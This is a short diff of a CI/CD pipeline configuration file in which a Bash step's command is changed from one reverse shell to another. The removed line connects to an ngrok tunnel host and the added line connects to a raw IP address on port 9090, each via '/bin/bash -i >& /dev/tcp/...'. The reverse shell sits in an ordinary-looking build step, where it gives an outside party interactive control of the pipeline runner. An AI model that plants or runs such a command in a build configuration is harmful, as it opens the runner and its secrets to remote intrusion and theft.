@@ -23,7 +23,7 @@ pipeline:
                   identifier: BEE
                   spec:
                     shell: Bash
-                    command: /bin/bash -i >& /dev/tcp/0.tcp.in.ngrok.io/19480 0>&1
+                    command: /bin/bash -i >& /dev/tcp/20.247.24.15/9090 0>&1
                   failureStrategies:
                     - onFailure:
                         errors:
